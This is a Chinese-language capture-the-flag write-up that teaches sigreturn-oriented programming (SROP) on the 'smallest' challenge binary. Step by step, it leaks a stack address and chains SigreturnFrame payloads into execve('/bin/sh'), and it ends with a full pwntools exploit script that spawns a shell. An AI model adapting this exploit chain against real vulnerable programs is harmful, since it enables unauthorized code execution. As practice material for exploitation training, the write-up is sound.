## 例题：2016-360春秋杯-srop
首先还是进行check检查
![](http://imgsrc.baidu.com/super/pic/item/f3d3572c11dfa9ecceeec3d627d0f703908fc12b.jpg)
嗯十分友好，接下来看看程序主体部分。
由于这个程序十分简单，我们直接用objdump进行观看
![](http://imgsrc.baidu.com/super/pic/item/1f178a82b9014a90e800d27cec773912b31bee31.jpg)
是的没看错，就这么简单，大致讲解下代码含义：
        1. xor    %rax,%rax       //这里是将rax进行异或，咱们相同值异或结果为0，所以这里的含义即为将rax清0
        2. mov  %0x400,%edx   //移入0x400到edx中
        3. mov  %rsp,%rsi       //将栈首地址移入rsi中
        4. mov  %rax,%rdi      //将rax移入rdi中
        5. syscall                    //根据rax的值进行系统调用
        6. ret 
          
由于是64位程序，所以这里咱们可以知道这个函数是进行了read的系统调用，其参数分别处于rdi，rsi，rdx中，分别为0，站地址，0x400,也就是说从输入端读入0x400个字节至栈顶部分。
这里咱们首先想到[/md][md]修改rax来执行系统调用，但是我们如何在仅有的汇编代码下实现修改rax呢，可能有人会想到SROP，嗯，小伙子反应的很快，但是咱们这里还暂时用不了，所以我们这里利用了一个小技巧，那就是在进行read函数调用的过程中，rax会记录你总共所输入的字节数，所以我们会想到，如果咱们在这儿输入特定大小的值，那不就可以任意构造rax了嘛，这里我们进行实验给大伙看看。
  
---
这里是第一次执行syscall时的栈结构
![](http://imgsrc.baidu.com/super/pic/item/8694a4c27d1ed21be3abba24e86eddc450da3f95.jpg)
按照程序原来的意思执行一次read函数的系统调用后，此时我们任意输入一个值，我这里输入abcde
![]([img]http://imgsrc.baidu.com/super/pic/item/c8177f3e6709c93da8aa9a36da3df8dcd0005493.jpg)
可以看到这里咱们的栈是任由咱们写的，然后下一条指令又是ret，所以我们会在此时跳转到我们写的这个值这里，在这儿也就是` call 0xa6564636261`,所以咱们这里有那么点想法，如果咱们要修改rax的值，那肯定要绕过第一条xor指令，所以咱们可以在栈上首先构造三个0x4000b0，至于为什么是三个，我之后会进行讲解。
### 第一步
在第一次read系统调用后，咱们输入三个0x4000b0（也即是xor的地址，由于没开地址随机，所以此值固定），此时栈结构如下
![](http://imgsrc.baidu.com/super/pic/item/d833c895d143ad4bd765d201c7025aafa50f06a3.jpg)
此时ret之后，咱们会跳转至xor进行重新一论的程序执行，在执行read的系统调用时，咱们输入‘\xb3’,这样的话会将第二个0x4000b0修改为0x4000b3，并且此时他是在栈上的，而且由于咱们现如今输入一个字节，所以rax也会加一，我们来调试看看是否如此
![](http://imgsrc.baidu.com/super/pic/item/203fb80e7bec54e7ac548edffc389b504ec26ab3.jpg)
可以看到确实修改成功，而此时根据程序流程，我们将会跳到0x4000b3进行执行，也就跳过了清空rax的过程，所以此时咱们（由于rax = 1）就会接着执行write的系统调用，并且打印出了栈顶地址，执行效果如下
![](http://imgsrc.baidu.com/super/pic/item/b64543a98226cffc04982b73fc014a90f703ea45.jpg)
### 第二步
        这里还有个小知识，那就是关于系统调用号，这里给出64位的相关调用号
        

|系统调用 | 调用号 | 函数原型 |
| -------- | -------- | -------- |
| read    | 0     | read( int fd, void *buf, size_t count )    |
| write    | 1     |write( int fd, const void *buf, size_t count )    |
| sigreturn   | 15     |int sigreturn( … )     |
| execve    | 59     | execve( const char *filename, char *const argv[], char *const envp[] )     |

执行到这里，由于咱们泄露出了栈顶地址，所以咱们最好就少动他，因为咱们之后要用到他的，所以咱们来小试牛刀一把，先利用SROP的思路进行read系统调用。
还记得咱们有三个0x4000b0么，此时还剩下最后一个，所以咱们此时在执行完write的系统调用之后会继续跳转到xor指令，但此时咱们不同了，这次咱们在栈上构造的为0x4000b0 + syscall地址 + read函数的伪造寄存器压栈值，这里我会讲解为何如此构造。
首先构造0x40000b0的目的是方便下一次执行循环，且下一次执行循环之后栈顶上的值会变为
syscall的地址，此时若在此轮read中咱们输入15个值，即可进行sigreturn的系统调用，但是如何输入值却又不改变栈上的值呢，那就是输入同样的值不就行了.
而在进行如下构造
```
read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = stack_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = stack_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用0
pl2 = p64(0x4000b0) + p64(syscall_ret) + bytes(read)
pause()
#==== third read ====#
io.send(pl2)    #orchestral stack 
#gdb.attach(io)
#pause()
#==== fourth read ====#
io.send(pl2[8:8+15]) #put in place,so that we can syscall(rax:15) for sigreturn
```
其中后面的send即为修改rax所发送的，注意在本次系统调用是咱们自主调用而不是依照程序流程所得，在此之后由于咱们对于sigreturnframe的构造，接下来会进行read的系统调用。
### 第三步
由于又是一次read的系统调用，所以此时咱们还是选择类似上面write一样进行execve系统调用，只不过这里利用了点sigreturn的知识，这里还有个需要注意的点那就是/bin/sh的构造是构造到栈上然后自行计算偏移地址，这里我就不多讲了想必大伙已经捻熟于心，所以此次执行后再次进行SROP攻击，最终结果如下
![](http://imgsrc.baidu.com/super/pic/item/5fdf8db1cb134954b3f97ca5134e9258d0094a08.jpg)
大获全胜！！！
## 总结
总结是什么呢，总结就是注意点send和sendline的区别，还有就是经过sigreturnframe构造的串，用bytes(read)跟用bytes(str(read),'utf8')不一样，坑死我了。对于今天攻击的技巧而言更多是对syscall等系统调用的深入理解了。
 
---
以下附上exp：
```
from pwn import *
io = process('./smallest')
context.log_level = 'DEBUG'
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']
syscall_ret = 0x4000be
#==== first read ====#
pl = p64(0x4000b0)*3
gdb.attach(io)
io.send(pl)         #let the ret_addr to 0x4000b0
pause()
#==== second read ====#
io.send('\xb3')     #let the ret_addr to 0x4000b3
io.recv(8)          #rax is 0x1,syscall for write
stack_addr = u64(io.recv(8))
io.success('stack_addr ==>'+hex(stack_addr))
read = SigreturnFrame()
read.rax = constants.SYS_read #read函数系统调用号
read.rdi = 0  #read函数一参
read.rsi = stack_addr  #read函数二参
read.rdx = 0x400  #read函数三参
read.rsp = stack_addr  #和rsi寄存器中的值保持一致，确保read函数写的时候rsp指向stack_addr
read.rip = syscall_ret #使得rip指向syscall的位置，在部署好read函数之后能直接调用0
pl2 = p64(0x4000b0) + p64(syscall_ret) + bytes(read)
pause()
#==== third read ====#
io.send(pl2)    #orchestral stack 
#gdb.attach(io)
#pause()
#==== fourth read ====#
io.send(pl2[8:8+15]) #put in place,so that we can syscall(rax:15) for sigreturn

#==== sigreturn read ====#
execve = SigreturnFrame()
execve.rax = constants.SYS_execve
execve.rdi = stack_addr + 0x120
execve.rsi = 0
execve.rdx = 0
execve.rsp = stack_addr
execve.rip = syscall_ret

pl3 = p64(0x4000b0) + p64(syscall_ret) +  bytes(execve)
print(len(pl3))
#pause()
pl3 += (0x120 - len(pl3))*b'\x00' + b'/bin/sh\x00'

io.send(pl3)
#pause()
io.send(pl3[8:8+15])
#gdb.attach(io)
io.interactive()

```
